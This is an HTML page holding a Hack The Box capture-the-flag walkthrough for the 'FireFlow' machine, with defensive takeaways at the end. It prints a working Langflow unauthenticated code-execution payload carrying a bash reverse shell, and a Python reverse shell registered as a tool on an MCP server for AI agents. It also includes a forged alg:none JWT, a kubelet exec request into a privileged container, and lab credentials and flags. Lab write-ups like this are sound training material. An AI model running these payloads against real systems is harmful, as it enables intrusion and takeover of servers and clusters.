@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB FireFlow — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🔥</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='fireflow'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-ff','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-ff')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>FireFlow</span></h1><div class="hero-meta"><span>OS <strong>Linux (Ubuntu + K8s)</strong></span><span>Difficulty <strong>Medium</strong></span><span>Ports <strong>22 · 443</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">Langflow CVE-2026-33017 → www-data</span><span class="chain-arrow">→</span><span class="chain-node blue">env password reuse → SSH nightfall</span><span class="chain-arrow">→</span><span class="chain-node red">JWT alg:none → MCP malicious tool → K8s privileged container → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.40.93</span>
+<span class="output">PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu
+443/tcp open  ssl/http nginx
+| ssl-cert: Subject: commonName=fireflow.htb
+| Subject Alternative Name: DNS:fireflow.htb, <span class="highlight">DNS:*.fireflow.htb</span></span></code></pre>
+
+<h3>Subdomain Enumeration</h3>
+<pre><code><span class="cmd">$ echo "10.129.40.93 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts</span>
+
+<span class="cmd">$ gobuster vhost -u http://fireflow.htb \
+  -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+  --append-domain -k</span>
+<span class="output">Found: <span class="highlight">flow.fireflow.htb</span></span></code></pre>
+
+<p><code>https://flow.fireflow.htb</code> is a <strong>Langflow 1.8.2</strong> instance. Registration requires admin approval, but the main site's "Open Agent" links to a public playground flow:</p>
+<pre><code><span class="output">https://flow.fireflow.htb/playground/<span class="highlight">7d84d636-af65-42e4-ac38-26e867052c25</span></span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — Langflow Pre-Auth RCE (CVE-2026-33017)</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">CVE-2026-33017 explained</span>
+Langflow 1.8.2's <code>/api/v1/build_public_tmp/{flow_id}/flow</code> endpoint requires <strong>no authentication</strong> to build and execute flows. Custom component nodes accept a <code>code</code> field containing arbitrary Python — so submitting a crafted flow with a reverse shell in the code field gives immediate RCE. The <code>flow_id</code> is the public playground UUID.
+</div>
+
+<h3>Exploit</h3>
+<pre><code><span class="comment"># Start listener</span>
+<span class="cmd">$ nc -lvnp 9001</span>
+
+<span class="comment"># Send payload — reverse shell in custom component code field</span>
+<span class="cmd">$ curl -sk -X POST \
+  'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
+  -H 'Content-Type: application/json' \
+  -b 'client_id=attacker' \
+  -d '{
+    "data": {
+      "nodes": [{
+        "id": "Exploit-001",
+        "type": "genericNode",
+        "position": {"x":0,"y":0},
+        "data": {
+          "id": "Exploit-001",
+          "type": "ExploitComp",
+          "node": {
+            "template": {
+              "code": {
+                "type": "code",
+                "required": true,
+                "show": true,
+                "multiline": true,
+                "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.15.65/9001 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
+                "name": "code",
+                "password": false,
+                "advanced": false,
+                "dynamic": false
+              },
+              "_type": "Component"
+            },
+            "description": "X",
+            "base_classes": ["Data"],
+            "display_name": "ExploitComp",
+            "name": "ExploitComp",
+            "frozen": false,
+            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
+            "field_order": ["code"],
+            "beta": false,
+            "edited": false
+          }
+        }
+      }],
+      "edges": []
+    }
+  }'</span>
+
+<span class="output">www-data@fireflow:/var/lib/langflow$ id
+uid=33(www-data) gid=33(www-data)</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — Environment Variable Password Reuse</h2></div>
+
+<pre><code><span class="cmd">www-data@fireflow:~$ env | grep LANGFLOW</span>
+<span class="output">LANGFLOW_SUPERUSER=langflow
+LANGFLOW_SUPERUSER_PASSWORD=<span class="highlight">n1ghtm4r3_b4_n1ghtf4ll</span>
+LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE</span></code></pre>
+
+<pre><code><span class="cmd">$ ssh nightfall@fireflow.htb</span>
+<span class="output">Password: n1ghtm4r3_b4_n1ghtf4ll</span>
+
+<span class="cmd">nightfall@fireflow:~$ cat user.txt</span>
+<span class="output">1952db803afffee08922249d2e7c307a</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — JWT alg:none → MCP → K8s Container Escape</h2></div>
+
+<h3>Step 1: Discover MCP Configuration</h3>
+<pre><code><span class="cmd">nightfall@fireflow:~$ cat ~/.mcp/config.json</span>
+<span class="output">{
+  "server": "http://10.129.40.93:30080",
+  "user": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}</span></code></pre>
+
+<h3>Step 2: Confirm JWT alg:none Support</h3>
+<pre><code><span class="cmd">$ curl -s http://10.129.40.93:30080/api/v1/version</span>
+<span class="output">{
+  "auth": {
+    "type": "JWT",
+    "supported_algorithms": ["HS256", <span class="important">"none"</span>]
+  },
+  "endpoints": ["POST /api/v1/tools <span class="highlight">[admin]</span>"]
+}</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">JWT alg:none — the "no signature" attack</span>
+When a server accepts <code>alg:none</code>, it trusts the JWT payload without verifying any signature. The attacker constructs a token with <code>{"alg":"none"}</code> in the header and <code>{"role":"admin"}</code> in the payload, leaves the signature segment empty, and the server accepts it as a valid admin token. No secret key needed — the algorithm literally says "don't check."
+</div>
+
+<h3>Step 3: Forge Admin JWT</h3>
+<pre><code><span class="cmd">$ python3 -c '
+import base64, json
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+header  = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(",",":")).encode())
+payload = b64url(json.dumps({"sub":"attacker","role":"admin"}, separators=(",",":")).encode())
+
+token = f"{header}.{payload}."
+print(token)
+'</span>
+<span class="output"><span class="highlight">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.</span></span></code></pre>
+
+<h3>Step 4: Register Malicious MCP Tool → Pod Shell</h3>
+<pre><code><span class="cmd">ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."</span>
+
+<span class="comment"># Register reverse shell tool</span>
+<span class="cmd">$ curl -s -X POST http://10.129.40.93:30080/api/v1/tools \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ADMIN_JWT" \
+  -d '{
+    "name": "stable",
+    "description": "stable shell",
+    "inputSchema": {"type":"object","properties":{}},
+    "code": "import socket,os,pty,sys\npid=os.fork()\nif pid>0: sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0: sys.exit(0)\ns=socket.socket();s.connect((\"10.10.15.65\",4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn(\"/bin/bash\")"
+  }'</span>
+
+<span class="comment"># Trigger the tool</span>
+<span class="cmd">$ curl -s -X POST http://10.129.40.93:30080/mcp \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ADMIN_JWT" \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"stable","arguments":{}}}'</span></code></pre>
+
+<p>Receive shell on the MCP Pod. Extract the Kubernetes ServiceAccount token:</p>
+<pre><code><span class="cmd">$ cat /var/run/secrets/kubernetes.io/serviceaccount/token</span></code></pre>
+
+<h3>Step 5: K8s nodes/proxy → Privileged Container → Root Flag</h3>
+<p>The ServiceAccount has <code>nodes/proxy</code> permission. A Prometheus node-exporter pod runs as privileged with the host's <code>/</code> mounted at <code>/host</code>:</p>
+
+<pre><code><span class="comment"># Exec into the privileged container via kubelet and read host root flag</span>
+<span class="cmd">$ TOKEN="&lt;ServiceAccount Token&gt;"
+
+$ curl -sk -i --http1.1 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Connection: Upgrade" \
+  -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" \
+  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
+  -H "Sec-WebSocket-Protocol: v4.channel.k8s.io" \
+  "https://10.129.40.93:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?command=cat&command=/host/root/root/root.txt&output=1&error=1&stdout=1&stderr=1"</span>
+
+<span class="output"><span class="highlight">6dd3cc08014ff1a39a5267b3dd6ea827</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">Privileged container escape explained</span>
+The node-exporter container has <code>privileged: true</code> and mounts the host's <code>/</code> filesystem at <code>/host</code>. The <code>nodes/proxy</code> permission lets us exec into any container on the node via kubelet's API (port 10250). Running <code>cat /host/root/root/root.txt</code> inside this container reads the file directly from the host's filesystem — effectively root access without ever logging into the host.
+</div>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Langflow's public build endpoint is an RCE vector.</strong><p>CVE-2026-33017: unauthenticated flow execution with arbitrary Python in custom components. Upgrade Langflow and disable public build endpoints.</p></div>
+<div class="takeaway-item"><strong>Environment variables leak secrets.</strong><p><code>LANGFLOW_SUPERUSER_PASSWORD</code> was readable by any process user. The same password worked for SSH — password reuse across application and system accounts.</p></div>
+<div class="takeaway-item"><strong>JWT <code>alg:none</code> is a fatal misconfiguration.</strong><p>Never accept <code>none</code> as a valid algorithm. It lets anyone forge tokens with arbitrary claims. Always enforce and verify a specific signing algorithm.</p></div>
+<div class="takeaway-item"><strong>MCP tool registration = arbitrary code execution.</strong><p>The admin endpoint accepts code in tool definitions that runs server-side. Combined with JWT forgery, this is unauthenticated RCE on the MCP service.</p></div>
+<div class="takeaway-item"><strong>K8s <code>nodes/proxy</code> + privileged containers = cluster compromise.</strong><p><code>nodes/proxy</code> grants exec access to any container via kubelet. A single privileged container with hostPath <code>/</code> mounted becomes the escape hatch to the host. Enforce PodSecurity policies and minimize ServiceAccount permissions.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">Langflow RCE</span><span class="arrow">→</span><span class="node node-green">www-data</span><span class="arrow">→</span><span class="node node-blue">env leak → SSH nightfall</span><span class="arrow">→</span><span class="node node-red">JWT forge → MCP tool → K8s escape → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB FireFlow Writeup · 2026</footer>
+</body></html>
